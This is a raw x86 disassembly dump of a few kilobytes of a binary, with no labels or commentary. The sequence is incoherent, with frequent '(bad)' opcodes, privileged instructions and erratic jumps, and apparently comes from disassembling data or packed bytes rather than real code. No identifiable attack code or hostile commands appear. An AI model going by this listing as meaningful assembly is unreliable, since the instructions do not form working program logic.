  427c4f:	lock cwde 
  427c51:	ret    
  427c52:	xor    al,BYTE PTR [ebp-0x77]
  427c55:	mov    esi,esp
  427c57:	rol    BYTE PTR [ebp-0x7c],1
  427c5a:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427c60:	call   edi
  427c62:	enter  0x4d45,0x8b
  427c66:	mov    esi,eax
  427c68:	fmul   st(3),st
  427c6a:	push   ebp
  427c6b:	dec    ebp
  427c6c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427c72:	ret    0xc198
  427c75:	xor    al,BYTE PTR [esi-0x280276]
  427c7b:	dec    ebp
  427c7c:	jne    0x427cb1
  427c7e:	mov    eax,DWORD PTR [ebx]
  427c80:	cld    
  427c81:	loopne 0x427c33
  427c83:	push   ebp
  427c84:	add    DWORD PTR [eax+0x72851100],ecx
  427c8a:	inc    DWORD PTR [eax]
  427c8c:	inc    DWORD PTR [ebp-0x75]
  427c8f:	mov    edi,esp
  427c91:	lock add bl,0x1
  427c95:	retf   
  427c96:	add    dh,al
  427c98:	xor    dh,cl
  427c9a:	inc    ebp
  427c9b:	scas   eax,DWORD PTR es:[edi]
  427c9c:	mov    eax,DWORD PTR [ebx]
  427c9e:	shl    al,0x0
  427ca1:	inc    ebp
  427ca2:	dec    DWORD PTR [ebx+0x4dccf0ff]
  427ca8:	call   0x458ee0
  427cad:	ud0    eax,ecx
  427cb0:	adc    al,0x4d
  427cb2:	inc    ebp
  427cb3:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  427cb9:	lock push 0x338055
  427cbf:	add    eax,DWORD PTR [eax]
  427cc1:	ud0    ecx,edx
  427cc4:	sbb    BYTE PTR [ebp+0x5e],dl
  427cc7:	xor    ecx,ecx
  427cc9:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  427cd0:	push   ecx
  427cd1:	add    BYTE PTR [ebp-0x38],cl
  427cd4:	mov    DWORD PTR [esi-0x740004],eax
  427cda:	cld    
  427cdb:	inc    ebp
  427cdc:	xchg   edx,eax
  427cdd:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  427ce3:	xabort 0xaf
  427ce6:	icebp  
  427ce7:	mov    esi,DWORD PTR [ebp-0x28]
  427cea:	(bad)  
  427ceb:	retf   
  427cec:	or     ecx,eax
  427cee:	(bad)  
  427cef:	dec    ebp
  427cf0:	pop    es
  427cf1:	(bad)  
  427cf2:	(bad)  
  427cf3:	or     BYTE PTR [esi],al
  427cf5:	jb     0x427cbd
  427cf7:	add    BYTE PTR [ebx],al
  427cf9:	inc    ebp
  427cfa:	(bad)  
  427cfb:	mov    ecx,DWORD PTR [edx]
  427cfd:	fadd   st(6),st
  427cff:	ret    
  427d00:	add    ch,BYTE PTR [eax-0x37]
  427d03:	int    0x55
  427d05:	sub    ebp,esp
  427d07:	add    edx,DWORD PTR [ecx-0x14]
  427d0a:	inc    ebp
  427d0b:	inc    ebp
  427d0c:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  427d12:	cld    
  427d13:	(bad)  
  427d14:	mov    gs,WORD PTR [edi+0xf893be0]
  427d1a:	mov    ebp,ebp
  427d1c:	clc    
  427d1d:	push   eax
  427d1f:	push   DWORD PTR [ebp-0x4]
  427d22:	mov    BYTE PTR [ebp+0xa],0xff
  427d26:	(bad)  
  427d27:	int3   
  427d28:	or     BYTE PTR [eax],al
  427d2a:	(bad)  
  427d2b:	lea    eax,[edi]
  427d2d:	ins    BYTE PTR es:[edi],dx
  427d2e:	(bad)  
  427d2f:	inc    DWORD PTR [ecx]
  427d31:	push   eax
  427d32:	mov    BYTE PTR [ebp+0x9],0x8b
  427d36:	leave  
  427d37:	les    edx,FWORD PTR [ebp+0x0]
  427d3a:	in     al,dx
  427d3b:	call   DWORD PTR [ecx-0x75]
  427d3e:	inc    ebp
  427d3f:	cld    
  427d40:	mov    DWORD PTR [eax+0x8b01fc],eax
  427d46:	cld    
  427d47:	xor    BYTE PTR [edi-0x76a8f98b],bh
  427d4d:	std    
  427d4e:	mov    eax,DWORD PTR [eax]
  427d50:	clc    
  427d51:	test   eax,esi
  427d53:	je     0x427dca
  427d55:	mov    eax,esi
  427d57:	cld    
  427d58:	add    al,0x80
  427d5a:	add    WORD PTR [ecx+0x0],ax
  427d5e:	fadd   QWORD PTR [eax]
  427d60:	mov    BYTE PTR [eax],0xd0
  427d63:	push   0xffffffc3
  427d65:	push   edi
  427d66:	mov    edx,DWORD PTR [eax+0x51]
  427d69:	pop    edi
  427d6a:	lea    ebx,[ebx-0x8]
  427d6d:	ret    0x45
  427d70:	mov    ecx,DWORD PTR [ebx-0x7241ae04]
  427d76:	xchg   eax,edi
  427d78:	mov    DWORD PTR [ebp-0x75],ecx
  427d7b:	push   esi
  427d7c:	clc    
  427d7d:	jne    0x427d4f
  427d7f:	mov    ecx,0xf8450b0b
  427d84:	(bad)  
  427d85:	push   cs
  427d86:	or     BYTE PTR [ebp-0x3a],dh
  427d89:	cmp    eax,DWORD PTR [ecx]
  427d8b:	pop    esi
  427d8c:	(bad)  
  427d8d:	or     al,0x5
  427d8f:	inc    eax
  427d90:	leave  
  427d91:	in     al,dx
  427d92:	add    al,0x42
  427d94:	push   esi
  427d95:	and    eax,0xedc940cf
  427d9a:	inc    DWORD PTR [eax-0x75]
  427d9d:	fmul   QWORD PTR [ebx-0xf8739be]
  427da3:	inc    eax
  427da4:	nop
  427da5:	jmp    0x518b:0x8b8bc3ff
  427dac:	(bad)  
  427dad:	lea    eax,ds:0xff45e8f8
  427db3:	push   esi
  427db4:	push   DWORD PTR [ebp-0x39]
  427db7:	mov    eax,0x7edda46
  427dbc:	or     al,0x6
  427dbe:	push   DWORD PTR [ebp-0x3a]
  427dc1:	cmp    eax,DWORD PTR [edx]
  427dc3:	pop    esi
  427dc4:	ret    
  427dc5:	or     al,0x56
  427dc7:	inc    ecx
  427dc8:	push   ebp
  427dc9:	js     0x427db7
  427dcb:	inc    edx
  427dcc:	inc    ebp
  427dcd:	int    0x1
  427dcf:	inc    ecx
  427dd0:	sub    BYTE PTR ds:0xe77541fc,ah
  427dd6:	add    DWORD PTR [edx+0x1c],eax
  427dd9:	int3   
  427dda:	mov    eax,ebx
  427ddc:	adc    al,0x8b
  427dde:	xchg   edx,eax
  427ddf:	push   ecx
  427de0:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  427de6:	rcl    DWORD PTR [esi-0x9],cl
  427de9:	jne    0x427e3b
  427deb:	mov    eax,0x7c80ece
  427df0:	rol    DWORD PTR [esi],cl
  427df2:	div    DWORD PTR [ebp+0x50]
  427df5:	cmp    ecx,edx
  427df7:	pop    esi
  427df8:	dec    BYTE PTR [edx]
  427dfa:	in     al,dx
  427dfb:	inc    edx
  427dfc:	sub    ebp,ecx
  427dfe:	inc    eax
  427dff:	(bad)  
  427e00:	push   eax
  427e01:	add    edx,DWORD PTR [eax-0x17]
  427e04:	push   edi
  427e05:	add    dh,dh
  427e07:	leave  
  427e08:	adc    DWORD PTR [ebp-0x1],0xffffffec
  427e0c:	add    BYTE PTR [ecx+0x0],dl
  427e0f:	inc    ebp
  427e10:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  427e16:	add    BYTE PTR [eax-0x7fbf448],bh
  427e1c:	add    al,0x2
  427e1e:	jmp    0x57e2978
  427e23:	jne    0x427e0d
  427e25:	mov    eax,DWORD PTR [edx]
  427e27:	or     BYTE PTR [eax],al
  427e29:	inc    ecx
  427e2a:	stc    
  427e2b:	in     eax,dx
  427e2c:	ss inc eax
  427e2e:	aas    
  427e2f:	out    0x7d,eax
  427e31:	inc    ecx
  427e32:	mov    esi,ecx
  427e34:	lock ret 0x7d
  427e38:	and    ecx,DWORD PTR [ebx-0x171777]
  427e3e:	add    bh,bh
  427e40:	aad    0xd7
  427e42:	add    dh,cl
  427e44:	clts   
  427e46:	(bad)  
  427e47:	call   0xffcd7d4c
  427e4c:	hlt    
  427e4d:	iret   
  427e4e:	jge    0x427e26
  427e50:	rol    DWORD PTR [esi-0x80],cl
  427e53:	icebp  
  427e54:	or     BYTE PTR [edi-0x27],cl
  427e57:	(bad)  
  427e58:	out    dx,al
  427e59:	mov    eax,DWORD PTR [ebx]
  427e5b:	(bad)  
  427e5c:	pop    esi
  427e5d:	push   es
  427e5e:	cmp    al,0xe8
  427e60:	sar    edi,0x8
  427e63:	inc    DWORD PTR [edi]
  427e65:	inc    esi
  427e66:	(bad)  
  427e67:	jmp    0x8b00:0x530e577e
  427e6e:	push   esi
  427e6f:	mov    eax,DWORD PTR [eax]
  427e71:	and    al,0x0
  427e73:	inc    ebp
  427e74:	push   eax
  427e75:	push   eax
  427e76:	add    DWORD PTR [ebx+0x757d1834],ecx
  427e7c:	sub    edx,DWORD PTR [esi-0x24]
  427e7f:	jne    0x427e37
  427e81:	lods   eax,DWORD PTR ds:[esi]
  427e82:	mov    edx,DWORD PTR [edx-0x34]
  427e85:	dec    esi
  427e86:	out    0x83,eax
  427e88:	into   
  427e89:	push   edi
  427e8b:	loopne 0x427e5b
  427e8d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  427e91:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  427e98:	rol    DWORD PTR [edx],0x8
  427e9b:	mov    esp,ecx
  427e9d:	cmp    DWORD PTR [ebx],0xc
  427ea0:	mov    esi,0x5001c0
  427ea5:	push   eax
  427ea6:	push   cs
  427ea7:	push   eax
  427ea8:	(bad)  
  427ea9:	sub    edx,edi
  427eab:	push   esi
  427eac:	adc    al,0xcb
  427eae:	ins    DWORD PTR es:[edi],dx
  427eaf:	mov    eax,0x203e8
  427eb4:	add    al,ah
  427eb6:	ror    BYTE PTR [eax+0xc007c0],0xc0
  427ebd:	add    dh,al
  427ebf:	add    ah,ch
  427ec1:	rol    DWORD PTR [ebx-0x3595fb0d],1
  427ec7:	pop    ecx
  427ec8:	or     eax,ebx
  427eca:	cli    
  427ecb:	add    BYTE PTR [ecx-0x4e728d1e],dh
  427ed1:	lea    ebp,[ebx]
  427ed3:	mov    edx,DWORD PTR [edx-0x4]
  427ed6:	dec    ecx
  427ed7:	inc    ebp
  427ed8:	shr    BYTE PTR [ebx],0x4b
  427edb:	and    al,0x0
  427edd:	(bad)  
  427ede:	jne    0x427f25
  427ee0:	pop    eax
  427ee1:	mov    al,0x5a
  427ee3:	call   0x1418142
  427ee8:	and    al,0x85
  427eea:	push   edx
  427eeb:	add    BYTE PTR [eax+eax*1+0x0],ah
  427eef:	dec    ebp
  427ef0:	mov    cl,0x23
  427ef2:	jmp    0x427ee0
  427ef4:	mov    al,0xe7
  427ef6:	call   0x13881e4
  427efb:	shr    DWORD PTR [eax+ebx*2],cl
  427efe:	lock (bad) 
  427f00:	adc    eax,0x757f008d
  427f05:	out    0x58,eax
  427f07:	cmp    al,0x7
  427f09:	pop    edx
  427f0a:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  427f11:	push   ecx
  427f12:	cld    
  427f13:	mov    esi,0x3b0175
  427f18:	and    al,0xb0
  427f1a:	xor    BYTE PTR [edx+0x1],0x8b
  427f1e:	add    ah,bh
  427f20:	mov    edi,DWORD PTR [ebp-0x4]
  427f23:	psubsw mm7,QWORD PTR [edi]
  427f26:	add    DWORD PTR [ebp+0x0],ebp
  427f29:	rcr    eax,1
  427f2b:	mov    edi,ecx
  427f2d:	and    eax,DWORD PTR [eax]
  427f2f:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  427f35:	call   0x12f821e
  427f3a:	add    al,cl
  427f3c:	mov    ebp,esi
  427f3e:	aam    0x83
  427f40:	or     DWORD PTR [ecx],eax
  427f42:	jne    0x427f35
  427f44:	mov    eax,DWORD PTR [eax]
  427f46:	aam    0x0
  427f48:	dec    ebp
  427f49:	jne    0x427ed6
  427f4b:	cmp    ebx,eax
  427f4d:	jb     0x427f9c
  427f4f:	jmp    0x427edc
  427f51:	mov    ebx,esp
  427f53:	int3   
  427f54:	dec    ebp
  427f55:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  427f5c:	mov    edx,0x8b0a8b
  427f61:	cmp    ecx,DWORD PTR [eax]
  427f63:	jb     0x427f3c
  427f65:	pop    edx
  427f66:	push   edi
  427f67:	cli    
  427f68:	pop    es
  427f69:	mov    eax,ecx
  427f6b:	jb     0x427f6f
  427f6d:	add    DWORD PTR [ebx],0xa
  427f70:	mov    eax,DWORD PTR [ebx]
  427f72:	int3   
  427f73:	add    bh,BYTE PTR [esi+0x75d10006]
  427f79:	jmp    0x427f06
  427f7b:	mov    al,0xe8
  427f7d:	call   0x10381ff
  427f82:	add    edx,DWORD PTR [ecx+ecx*8]
  427f85:	pop    edi
  427f86:	or     BYTE PTR [ecx-0x73],bl
  427f89:	pop    ecx
  427f8a:	inc    edi
  427f8b:	xor    al,0xeb
  427f8d:	push   ecx
  427f8e:	mov    edi,DWORD PTR [edx+0xc506cc]
  427f94:	call   0xb18099
  427f99:	int3   
  427f9a:	sbb    BYTE PTR [esi],ch
  427f9c:	inc    ebp
  427f9d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  427fa3:	call   0x9b8212
  427fa8:	or     BYTE PTR [ebx-0x73],dl
  427fab:	cmp    al,0x47
  427fad:	mov    al,0x1
  427faf:	jb     0x427fb1
  427fb1:	mov    al,0x10
  427fb3:	push   eax
  427fb4:	add    al,0x75
  427fb6:	add    BYTE PTR [ebx],ch
  427fb8:	add    ebx,esp
  427fba:	int3   
  427fbb:	jne    0x427fcd
  427fbd:	movsx  edx,cl
  427fc0:	add    DWORD PTR [eax],eax
  427fc2:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  427fc9:	mov    gs,edi
  427fcb:	add    BYTE PTR [eax-0x50],ch
  427fce:	add    al,ch
  427fd0:	mov    eax,DWORD PTR [ecx]
  427fd2:	sub    eax,DWORD PTR [eax]
  427fd4:	jb     0x42804b
  427fd6:	add    DWORD PTR [esp+eiz*8-0x50],esi
  427fda:	jge    0x427fc4
  427fdc:	add    al,0x1
  427fde:	add    DWORD PTR [eax],0x0
  427fe1:	jne    0x427fe3
  427fe3:	je     0x42802a
  427fe5:	mov    eax,DWORD PTR [edi]
  427fe7:	ror    BYTE PTR [ebp+0x4d],1
  427fea:	or     DWORD PTR [ecx+0x4d03d004],0x3
  427ff1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  427ff7:	mov    DWORD PTR [ebx],ebp
  427ff9:	fadd   DWORD PTR [eax+0x75]
  427ffc:	inc    eax
  427ffd:	pop    eax
  427ffe:	lea    ebx,[ecx+0x4f]
  428001:	push   0xb1000003
  428006:	out    dx,eax
  428007:	add    ebp,DWORD PTR [edx+edx*2]
  42800a:	add    BYTE PTR [ebx+ecx*4],bh
  42800d:	mov    ch,BYTE PTR [ebx]
  42800f:	jb     0x428083
  428011:	add    al,0x89
  428013:	push   eax
  428014:	call   0x842acd86
  428019:	add    DWORD PTR [eax+eax*1],eax
  42801c:	jae    0x428032
  42801e:	icebp  
  42801f:	inc    ebp
  428020:	mov    eax,DWORD PTR gs:[ecx]
  428023:	int3   
  428024:	out    dx,al
  428025:	loopne 0x428074
  428027:	sub    eax,DWORD PTR [edx]
  428029:	push   0xffffff83
  42802b:	pop    esi
  42802c:	push   cs
  42802d:	jl     0x428048
  42802f:	add    al,0xaf
  428031:	xor    eax,0x832b6d00
  428036:	mov    eax,DWORD PTR [edx]
  428038:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42803e:	ror    DWORD PTR [ebx+0x7dc8e803],1
  428044:	inc    ebp
  428045:	shr    ebx,0x3
  428048:	or     DWORD PTR [eax],0x4
  42804b:	push   0xffffffa5
  42804d:	pop    esi
  42804e:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  428055:	jmp    0x4280b4
  428057:	mov    edi,0xff0272
  42805c:	fdivr  QWORD PTR [ebp+0x5d]
  42805f:	push   0x4e
  428061:	pop    ecx
  428062:	call   0x42c467
  428067:	mov    DWORD PTR [ebx],eax
  428069:	in     al,0xc8
  42806b:	rol    BYTE PTR [ebp-0x75],0xc1
  42806f:	call   0xac8250
  428074:	pop    esi
  428075:	enter  0xceff,0x8b
  428079:	repz mov ecx,DWORD PTR [ebp-0x34]
  42807d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  428084:	je     0x428086
  428086:	or     DWORD PTR [ebx-0x74183b24],eax
  42808c:	jne    0x428072
  42808e:	jmp    0x428089
  428090:	push   DWORD PTR [edx-0x24]
  428093:	push   0x4d
  428095:	pop    ecx
  428096:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42809a:	jge    0x4280a2
  42809c:	mov    eax,eax
  42809e:	sub    ebp,DWORD PTR [edx+0x24]
  4280a1:	pop    esi
  4280a2:	inc    ebp
  4280a3:	mov    esp,0x8b6077
  4280a8:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  4280ae:	lods   al,BYTE PTR ds:[esi]
  4280af:	add    BYTE PTR [ebx],bh
  4280b1:	enter  0xce73,0x49
  4280b5:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  4280bd:	stc    
  4280be:	jge    0x428132
  4280c0:	jnp    0xdd42042f
  4280c6:	call   0xc5819c
  4280cb:	fadd   st(0),st
  4280cd:	dec    esi
  4280ce:	ins    BYTE PTR es:[edi],dx
  4280cf:	stc    
  4280d0:	cmp    al,0x73
  4280d2:	push   ebp
  4280d3:	mov    eax,0xf8028b
  4280d8:	jne    0x42809b
  4280da:	mov    esi,ecx
  4280dc:	mov    esp,DWORD PTR [ebp+0x2c]
  4280df:	add    edi,DWORD PTR [ebp-0x24]
  4280e2:	sub    esp,eax
  4280e4:	and    al,0x45
  4280e6:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  4280ec:	sbb    al,0xee
  4280ee:	pop    esi
  4280ef:	call   0x82811f
  4280f4:	fsubr  st,st(3)
  4280f6:	sti    
  4280f7:	add    BYTE PTR gs:[ecx],bh
  4280fa:	add    eax,esp
  4280fc:	add    DWORD PTR [esi],eax
  4280fe:	rol    DWORD PTR [ebp+0x8],0x29
  428102:	mov    esp,eax
  428104:	clc    
  428105:	jne    0x42817c
  428107:	mov    eax,0x8b0673
  42810c:	loopne 0x428153
  42810e:	loopne 0x428099
  428110:	lods   al,BYTE PTR ds:[esi]
  428111:	int3   
  428112:	inc    ebp
  428113:	mov    DWORD PTR gs:[eax+edi*8],eax
  428117:	add    al,0xc3
  428119:	sub    ecx,DWORD PTR [ebp+0x47]
  42811c:	(bad)  
  42811e:	shr    BYTE PTR [ebp-0x1f],0xe8
  428122:	add    eax,DWORD PTR [eax]
  428124:	call   0x6444229
  428129:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42812f:	dec    esi
  428130:	ins    DWORD PTR es:[edi],dx
  428131:	in     al,dx
  428132:	lea    eax,[eax]
  428134:	inc    ebp
  428135:	inc    ebp
  428136:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42813c:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  428146:	and    al,0xdc
  428148:	ror    DWORD PTR [edx+0x24],0xf7
  42814c:	or     BYTE PTR [ebp+0x4c],dh
  42814f:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  428153:	stos   BYTE PTR es:[edi],al
  428154:	adc    edx,edi
  428156:	inc    esp
  428157:	add    edi,DWORD PTR [eax]
  428159:	jne    0x42813e
  42815b:	mov    DWORD PTR [eax-0x7449db04],ecx
  428161:	cmp    ecx,DWORD PTR [edi]
  428163:	sub    BYTE PTR [ebp-0x7e],dl
  428166:	sar    ebp,0xb
  428169:	jmp    FWORD PTR [edi+0x2400392a]
  42816f:	sub    esi,DWORD PTR [ebx-0x73]
  428172:	mov    esp,DWORD PTR [ecx+edi*4]
  428175:	mov    ecx,DWORD PTR [eax]
  428177:	and    BYTE PTR [eax],al
  428179:	jne    0x428145
  42817b:	sub    ebp,ecx
  42817d:	sbb    BYTE PTR [esi+0x32],ah
  428180:	dec    ebp
  428181:	push   ebp
  428182:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  428188:	ret    
  428189:	mov    edx,ebp
  42818b:	leave  
  42818c:	sub    DWORD PTR [esi+0x24],ebx
  42818f:	ret    0x2b
  428192:	pop    ax
  428194:	push   ebp
  428195:	rol    BYTE PTR [ebx],0xeb
  428198:	add    DWORD PTR [ecx+0x6c0001],0x40
  42819f:	jb     0x4281f6
  4281a1:	ret    
  4281a2:	in     al,dx
  4281a3:	jecxz  0x428130
  4281a5:	push   esi
  4281a6:	xchg   esp,eax
  4281a7:	jne    0x4281a9
  4281a9:	cmp    edx,DWORD PTR [esi+0x1c]
  4281ac:	jne    0x428192
  4281ae:	mov    eax,DWORD PTR [ebp-0x77]
  4281b1:	ror    DWORD PTR [ebx+0x899408],0xe0
  4281b8:	mov    esi,DWORD PTR [ebp-0x75]
  4281bb:	pop    esi
  4281bc:	nop
  4281bd:	mov    eax,DWORD PTR [eax]
  4281bf:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4281c5:	add    al,0x0
  4281c7:	inc    ebp
  4281c8:	mov    eax,DWORD PTR [ebx]
  4281ca:	mov    ebp,ebx
  4281cc:	cmp    al,0xf
  4281ce:	or     al,al
  4281d0:	inc    ebp
  4281d1:	inc    ebp
  4281d2:	cmp    BYTE PTR [ebx+0x6c8bc89c],cl
  4281d8:	cld    
  4281d9:	add    BYTE PTR [edi+0x506c16c0],dh
  4281df:	add    BYTE PTR [ecx-0x5],dl
  4281e2:	add    eax,0x17200
  4281e7:	sbb    al,0x85
  4281e9:	dec    esp
  4281ea:	je     0x428224
  4281ec:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4281f0:	add    BYTE PTR [ebx],bh
  4281f2:	(bad)  
  4281f3:	and    al,0x39
  4281f5:	jae    0x428193
  4281f7:	mov    cl,cl
  4281f9:	inc    DWORD PTR [esp]
  4281fc:	push   ebp
  4281fd:	shr    esp,0x8
  428200:	in     al,dx
  428201:	push   esp
  428202:	add    DWORD PTR [eax],esp
  428204:	add    bl,cl
  428206:	inc    ebp
  428207:	mov    bh,0x89
  428209:	add    ah,bh
  42820b:	jmp    0xca7b9155
  428210:	pushf  
  428211:	dec    esp
  428212:	mov    edx,0xf8178520
  428217:	fst    DWORD PTR [ebp+0x0]
  42821a:	mov    BYTE PTR [eax],0xc4
  42821d:	sub    edx,DWORD PTR [ebx-0x3f]
  428220:	inc    ebp
  428221:	add    eax,0xc601dc
  428226:	mov    al,0xc6
  428229:	ins    BYTE PTR es:[edi],dx
  42822a:	mov    DWORD PTR [eax+0x57],0x2e0545c1
  428231:	dec    esp
  428232:	jmp    DWORD PTR [eax]
  428234:	inc    ebp
  428235:	fnstcw WORD PTR [eax+0x29]
  428238:	test   BYTE PTR [eax],0xc5
  42823b:	rol    BYTE PTR [eax],0xc0
  42823e:	lea    ecx,[ebp-0x3cf0dbcb]
  428244:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  42824a:	inc    esi
  42824b:	add    DWORD PTR [eax],ebx
  42824d:	add    dh,bh
  42824f:	mov    esi,DWORD PTR [edx+0x8]
  428252:	(bad)  
  428253:	fdiv   QWORD PTR ss:[ecx]
  428256:	(bad)  
  428257:	mov    bl,ch
  428259:	add    esi,eax
  42825b:	add    dh,bl
  42825d:	or     esi,eax
  42825f:	mov    dl,0xdf
  428261:	add    esi,eax
  428263:	add    al,ah
  428265:	push   cs
  428266:	mov    BYTE PTR [edx+0xc601e1],0xe2
  42826d:	or     BYTE PTR [ebx],dh
  42826f:	dec    ecx
  428270:	lea    eax,[ebx]
  428272:	xor    eax,0x18fc0fc7
  428277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428278:	repz clc 
  42827a:	add    eax,DWORD PTR [ebp+0x46]
  42827d:	prefetcht0 BYTE PTR [ecx-0x2]
  428281:	xor    eax,0x7c60872
  428286:	mov    esp,0xbd32c698
  42828b:	pop    esi
  42828c:	mov    cl,0xbe
  42828f:	or     al,0xc6
  428291:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  428298:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  42829f:	add    dh,al
  4282a1:	mov    eax,ebx
  4282a3:	xor    DWORD PTR [ebx],0x35008dbc
  4282a9:	mov    ecx,DWORD PTR [edi]
  4282ab:	sbb    al,0x18
  4282ad:	inc    ebp
  4282ae:	xrelease mov DWORD PTR [ebx],0x188546f4
  4282b5:	clc    
  4282b6:	(bad)  
  4282b7:	cmp    BYTE PTR [edx-0x64],dh
  4282ba:	lea    ecx,[ecx+0x45ffe838]
  4282c0:	mov    ecx,esp
  4282c2:	fadd   st,st(6)
  4282c4:	dec    ebp
  4282c5:	lds    edi,FWORD PTR [eax+0x7145fc56]
  4282cb:	out    0x1,eax
  4282cd:	inc    ebp
  4282ce:	lea    ebp,ds:0xc8ffc6ff
  4282d4:	enter  0xa33,0xc6
  4282d8:	push   ebp
  4282d9:	leave  
  4282da:	(bad)  
  4282db:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  4282e1:	add    BYTE PTR [ebp+0x44],al
  4282e4:	mov    eax,esp
  4282e6:	mov    WORD PTR [esi+0x43398300],?
  4282ec:	psubusw mm4,QWORD PTR [eax-0x78]
  4282f0:	add    BYTE PTR [ebx-0x1303f975],al
  4282f6:	add    BYTE PTR [ebp+0x1],0xf3
  4282fa:	add    BYTE PTR [ebp+0x38],al
  4282fd:	in     eax,dx
  4282fe:	inc    ebp
  4282ff:	inc    ebp
  428300:	mov    esp,ebx
  428302:	add    BYTE PTR [ebp+0x0],0xee
  428306:	mov    DWORD PTR [ebp-0x48],eax
  428309:	sub    eax,0x2e00454f
  42830e:	js     0x428355
  428310:	data16 js 0x428298
  428313:	idiv   bh
  428315:	inc    esp
  428316:	(bad)  
  428317:	fadd   st(7),st
  428319:	mov    dh,0x89
  42831b:	and    DWORD PTR [esi+0x43],0xffffffff
  42831f:	fld    DWORD PTR [ebx-0x767cc078]
  428325:	pop    es
  428326:	push   0x8d45ffec
  42832b:	in     eax,dx
  42832c:	inc    DWORD PTR [ebp-0x77]
  42832f:	loopne 0x42839b
  428331:	inc    ebp
  428332:	jmp    esp
  428334:	add    DWORD PTR [ebp+0x11],0xfffffff1
  428338:	mov    DWORD PTR [ebp+0x6c],eax
  42833b:	(bad)  
  42833d:	inc    ebp
  42833e:	(bad)  
  42833f:	call   0xe7cbc850
  428344:	outs   dx,BYTE PTR ds:[esi]
  428345:	inc    ebp
  428346:	(bad)  
  428347:	js     0x4282cc
  428349:	div    BYTE PTR ds:0x70bc8944
  42834f:	mov    dh,0xff
  428351:	or     DWORD PTR [ebp-0x7626f5bd],0xffffff88
  428358:	jb     0x4282dd
  42835a:	dec    DWORD PTR [eax]
  42835c:	mov    ebp,esp
  42835e:	test   WORD PTR [ebp-0x1],ax
  428365:	inc    ebp
  428366:	ror    BYTE PTR [ebx-0x117a279a],0xff
  42836d:	adc    edi,edi
  42836f:	mov    ecx,esi
  428371:	mov    eax,DWORD PTR [eax]
  428373:	cmp    BYTE PTR [esi-0x1],ah
  428376:	test   DWORD PTR [ebx],edi
  428378:	push   DWORD PTR [ebp-0x1]
  42837b:	mov    DWORD PTR [esi-0x48],ebp
  42837e:	add    BYTE PTR [ebp+0x66],al
  428381:	jmp    0x428308
  428383:	pushf  
  428384:	dec    DWORD PTR [ebx-0x7f9c0301]
  42838a:	add    BYTE PTR [ecx],al
  42838c:	data16 add BYTE PTR [ebp-0x7a00c8],al
  428393:	add    al,al
  428395:	add    BYTE PTR [esi+0x45],ah
  428398:	test   DWORD PTR [ebx+0xff7cff],ecx
  42839e:	dec    esp
  42839f:	mov    DWORD PTR [eax],eax
  4283a1:	mov    esp,DWORD PTR [esi-0x4]
  4283a4:	inc    ebp
  4283a5:	cmp    BYTE PTR [eax+0x4701],0x38
  4283ac:	mov    DWORD PTR [ecx-0x7e],esp
  4283af:	add    BYTE PTR [edi-0x73],al
  4283b2:	push   0xffffffd1
  4283b4:	mov    WORD PTR [ebp+0x64],ax
  4283b8:	(bad)  
  4283b9:	call   eax
  4283bb:	mov    esp,eax
  4283bd:	data16 icebp 
  4283bf:	test   DWORD PTR [ebp-0x1],eax
  4283c2:	(bad)  
  4283c4:	out    0xc0,eax
  4283c6:	lea    esp,[esi-0x30]
  4283c9:	test   DWORD PTR [edx+0x43ff80ff],ecx
  4283cf:	inc    edi
  4283d0:	jmp    0x75ff:0x40858866
  4283d7:	dec    DWORD PTR [ebp-0x7a992f40]
  4283dd:	test   esi,edi
  4283df:	(bad)  
  4283e0:	(bad)  
  4283e1:	inc    DWORD PTR [ebp-0x9901b9]
  4283e7:	test   DWORD PTR [ebx+0x50fff4ff],ecx
  4283ed:	rcl    BYTE PTR [ecx+0x66],0x33
  4283f1:	test   DWORD PTR [ebx+0xff72ff],edi
  4283f7:	inc    edi
  4283f8:	ret    
  4283f9:	mov    ax,WORD PTR [ebp-0x3f0004]
  428400:	push   eax
  428401:	mov    DWORD PTR [ebp-0x77],0xff98748b
  428408:	add    BYTE PTR [ebx-0x764ff439],al
  42840e:	push   DWORD PTR [esi+0x1]
  428411:	inc    DWORD PTR [eax]
  428413:	mov    eax,0xff99ff
  428418:	or     BYTE PTR [ecx-0x7a87bb],cl
  42841e:	jne    0x4283d8
  428420:	add    DWORD PTR [edx-0x76edff72],0xff707a8d
  42842a:	mov    ecx,0xd74fb8
  42842f:	add    cl,al
  428431:	mov    DWORD PTR [ecx-0x3f007784],ecx
  428437:	or     DWORD PTR [ebx+0x558966ec],0x7e
  42843e:	(bad)  
  42843f:	push   ebp
  428441:	mov    eax,0x8c2789
  428446:	ret    0x6689
  428449:	adc    BYTE PTR [ebp+0x4c],0x8d
